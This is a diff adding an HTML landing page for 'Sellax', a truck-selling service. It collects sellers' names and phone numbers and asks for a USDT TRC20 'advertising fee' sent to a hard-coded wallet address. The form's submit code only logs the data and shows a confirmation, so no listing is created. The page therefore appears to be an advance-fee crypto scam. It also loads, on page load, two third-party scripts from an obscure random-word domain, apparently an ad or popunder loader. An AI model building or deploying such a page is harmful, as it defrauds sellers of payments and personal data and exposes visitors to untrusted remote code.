@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+   <meta name="author" content="Sellax Organization">
+  <meta name="description" content="Sellax is the ultimate platform to sell your trucks online with ease. Upload images, add truck details, and reach thousands of potential buyers through targeted advertising on Google and social media.">
+  <meta name="keywords" content="Sell Trucks Online, Truck Marketplace, Truck Sales Platform, Online Truck Selling, Truck Advertising, Sellax">
+  <meta name="robots" content="index, follow">
+
+  <!-- Open Graph Meta Tags for Social Media Sharing -->
+  <meta property="og:title" content="Sellax - Sell Your Trucks Online">
+  <meta property="og:description" content="Easily sell your trucks online with Sellax. Upload details, set your price, and let us advertise your listing across Google and social media.">
+  <meta property="og:image" content="https://media.istockphoto.com/id/1473399446/photo/salesman-showing-trucks-to-a-customer-at-the-dealership.jpg?s=612x612&w=0&k=20&c=mvj3I0fu6PpZog5ZTHMTsv0tzCZMNNDl7OT1DkRJqi4=">
+  <meta property="og:url" content="https://example.com">
+  <meta property="og:type" content="website">
+
+  <!-- Favicon -->
+  <link rel="icon" href="https://media.istockphoto.com/id/1473399446/photo/salesman-showing-trucks-to-a-customer-at-the-dealership.jpg?s=612x612&w=0&k=20&c=mvj3I0fu6PpZog5ZTHMTsv0tzCZMNNDl7OT1DkRJqi4=" type="image/png">
+  
+  <title>Sellax - Sell Your Truck Online & get paid</title>
+  <style>
+    /* General Styles */
+body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #f9fafc;
+  color: #333;
+}
+
+header {
+  background-image: url('https://media.istockphoto.com/id/1473399446/photo/salesman-showing-trucks-to-a-customer-at-the-dealership.jpg?s=612x612&w=0&k=20&c=mvj3I0fu6PpZog5ZTHMTsv0tzCZMNNDl7OT1DkRJqi4='); /* Replace with your image URL */
+  background-size: cover; /* Ensures the image covers the entire header */
+  background-position: center; /* Centers the image */
+  background-repeat: no-repeat; /* Prevents the image from repeating */
+  color: white;
+  text-align: center;
+  padding: 1em 0;
+}
+
+header h1 {
+  margin: 0;
+  font-size: 2em;
+}
+
+header p {
+  margin: 0.5em 0;
+}
+
+main {
+  padding: 20px;
+  max-width: 600px;
+  margin: auto;
+  background: white;
+  border-radius: 8px;
+  box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+  gap: 15px;
+}
+
+form h2 {
+  margin-top: 20px;
+  border-bottom: 2px solid #4CAF50;
+  padding-bottom: 5px;
+}
+
+label {
+  font-weight: bold;
+  margin-top: 10px;
+}
+
+input, textarea {
+  padding: 8px;
+  margin-top: 5px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+}
+
+input[type="file"] {
+  border: none;
+}
+
+button {
+  background-color: #4CAF50;
+  color: white;
+  border: none;
+  padding: 10px;
+  margin-top: 15px;
+  cursor: pointer;
+  border-radius: 4px;
+  font-size: 1em;
+}
+
+button:hover {
+  background-color: #45a049;
+}
+
+#confirmationMessage {
+  text-align: center;
+  margin-top: 20px;
+  background-color: #e8f5e9;
+  border: 1px solid #c8e6c9;
+  padding: 20px;
+  border-radius: 8px;
+}
+
+.hidden {
+  display: none;
+}
+
+
+.container {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 20px;
+}
+
+.section {
+  padding: 60px 0;
+  text-align: center;
+}
+
+h2 {
+  font-size: 2em;
+  margin-bottom: 20px;
+  color: #333;
+}
+
+
+
+/* Description Section */
+#description p {
+  font-size: 1.1em;
+  margin: 20px 0;
+  color: #555;
+}
+
+.responsive-img {
+  width: 100%;
+  max-width: 600px;
+  height: auto;
+  margin-top: 20px;
+  border-radius: 8px;
+  box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+}
+
+/* Key Features Section */
+.bg-light {
+  background-color: #f9fafc;
+}
+
+.features-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+  gap: 20px;
+  margin-top: 30px;
+}
+
+.feature-card {
+  background: white;
+  padding: 20px;
+  border-radius: 8px;
+  text-align: center;
+  box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+}
+
+.feature-card h3 {
+  font-size: 1.2em;
+  margin-bottom: 10px;
+}
+
+.feature-card p {
+  font-size: 0.9em;
+  color: #666;
+}
+
+/* Why Choose Us Section */
+#why-choose ul {
+  list-style: none;
+  padding: 0;
+  text-align: left;
+  max-width: 600px;
+  margin: 0 auto;
+}
+
+#why-choose ul li {
+  font-size: 1.1em;
+  margin: 10px 0;
+  color: #444;
+}
+
+
+
+footer {
+  text-align: center;
+  margin-top: 30px;
+  padding: 10px 0;
+  background-color: #4CAF50;
+  color: white;
+}
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Sellax - Sell Your Truck Online</h1>
+    <p>List your truck and reach thousands of potential buyers worldwide!</p>
+  </header>
+  
+ 
+ 
+ <!-- Website Description Section -->
+  <section id="description" class="section">
+    <div class="container">
+      <h2>About Sellax</h2>
+      <p>
+        Sellax is your one-stop platform for selling trucks seamlessly online. With an intuitive user interface, 
+        powerful advertising tools, and a global reach, we ensure your truck listings get the visibility they deserve.
+      </p>
+      <img src="https://www.topmarkfunding.com/wp-content/uploads/2020/04/semi-truck-for-sale-768x509.jpg" alt="Truck Illustration" class="responsive-img">
+    </div>
+  </section>
+
+  <!-- Key Features Section -->
+  <section id="features" class="section bg-light">
+    <div class="container">
+      <h2>Key Features</h2>
+      <div class="features-grid">
+        <div class="feature-card">
+          <h3>🖼️ Easy Truck Upload</h3>
+          <p>Upload high-quality photos and provide detailed descriptions effortlessly.</p>
+        </div>
+        <div class="feature-card">
+          <h3>📲 Direct Communication</h3>
+          <p>Share your contact and WhatsApp details for easy communication with buyers.</p>
+        </div>
+        <div class="feature-card">
+          <h3>📢 Wide Reach Advertising</h3>
+          <p>Your listings will be advertised on Google and social media platforms.</p>
+        </div>
+        <div class="feature-card">
+          <h3>💳 Secure Payments</h3>
+          <p>Affordable one-time advertising fee via secure USDT (TRC20) payments.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Why Choose Us Section -->
+  <section id="why-choose" class="section">
+    <div class="container">
+      <h2>Why Choose Sellax?</h2>
+      <ul>
+        <li>✅ Maximum Visibility on Global Platforms</li>
+        <li>✅ Affordable One-Time Advertising Fee</li>
+        <li>✅ User-Friendly Interface for Easy Listings</li>
+        <li>✅ Dedicated Support Team</li>
+        <li>✅ Fast and Reliable Service</li>
+      </ul>
+    </div>
+  </section>
+  
+
+
+  <main>
+    <form id="truckForm">
+      <h2>Truck Details</h2>
+      <label>Truck Images:</label>
+      <input type="file" id="truckImages" multiple required>
+
+      <label>Truck Description:</label>
+      <textarea id="truckDescription" placeholder="Describe your truck" required></textarea>
+
+      <label>Truck Amount ($):</label>
+      <input type="number" id="truckAmount" placeholder="Enter amount" required>
+
+      <h2>Seller Information</h2>
+      <label>Full Name:</label>
+      <input type="text" id="sellerName" placeholder="Enter your full name" required>
+
+      <label>Contact Number:</label>
+      <input type="tel" id="contactNumber" placeholder="Enter your phone number" required>
+
+      <label>WhatsApp Number:</label>
+      <input type="tel" id="whatsappNumber" placeholder="Enter your WhatsApp number" required>
+
+      <h2>Advertising Fee</h2>
+      <p>Please transfer <strong>$13.76 USDT</strong> to the wallet below:</p>
+      <p><strong>Network:</strong> TRC20</p>
+      <p><strong>Address:</strong> <span id="walletAddress">TMUDuZzsL7AQ578D3dHGr5vEVXyB2c7XWz</span></p>
+      <button type="button" id="copyAddressBtn">Copy Wallet Address</button>
+
+      <button type="submit">Submit Listing</button>
+    </form>
+    
+    <div id="confirmationMessage" class="hidden">
+      <h2>Thank You!</h2>
+      <p>Your listing has been received. Our team will contact you after payment confirmation.</p>
+    </div>
+  </main>
+
+  <footer>
+    <p>&copy; 2025 Sellax. All rights reserved.</p>
+  </footer>
+
+  <script>
+    // Smooth Scroll for Navigation
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+  anchor.addEventListener('click', function (e) {
+    e.preventDefault();
+    document.querySelector(this.getAttribute('href')).scrollIntoView({
+      behavior: 'smooth'
+    });
+  });
+});
+
+// Feature Interaction Example (Optional)
+const featureCards = document.querySelectorAll('.feature-card');
+
+featureCards.forEach(card => {
+  card.addEventListener('mouseover', () => {
+    card.style.transform = 'scale(1.05)';
+    card.style.transition = 'transform 0.3s';
+  });
+  card.addEventListener('mouseout', () => {
+    card.style.transform = 'scale(1)';
+  });
+});
+  </script>
+  
+  <script>
+    document.getElementById('copyAddressBtn').addEventListener('click', function() {
+  const walletAddress = document.getElementById('walletAddress').innerText;
+  navigator.clipboard.writeText(walletAddress)
+    .then(() => alert('Wallet address copied to clipboard!'))
+    .catch(() => alert('Failed to copy wallet address.'));
+});
+
+document.getElementById('truckForm').addEventListener('submit', function(event) {
+  event.preventDefault();
+
+  // Gather form data
+  const truckImages = document.getElementById('truckImages').files;
+  const truckDescription = document.getElementById('truckDescription').value;
+  const truckAmount = document.getElementById('truckAmount').value;
+  const sellerName = document.getElementById('sellerName').value;
+  const contactNumber = document.getElementById('contactNumber').value;
+  const whatsappNumber = document.getElementById('whatsappNumber').value;
+
+  if (truckImages.length === 0 || !truckDescription || !truckAmount || !sellerName || !contactNumber || !whatsappNumber) {
+    alert('Please fill in all required fields!');
+    return;
+  }
+
+  // Simulate successful submission
+  document.getElementById('truckForm').classList.add('hidden');
+  document.getElementById('confirmationMessage').classList.remove('hidden');
+
+  console.log({
+    truckImages,
+    truckDescription,
+    truckAmount,
+    sellerName,
+    contactNumber,
+    whatsappNumber
+  });
+});
+  </script>
+  
+  <script async="async" data-cfasync="false" src="//slushhelmetmirth.com/9966ae64cf110953dea5afe977bbd29c/invoke.js"></script>
+<div id="container-9966ae64cf110953dea5afe977bbd29c"></div>
+
+<script type='text/javascript' src='//slushhelmetmirth.com/7a/ea/37/7aea374aead78bb3565a57a14614b80d.js'></script>
+
+</body>
+</html>
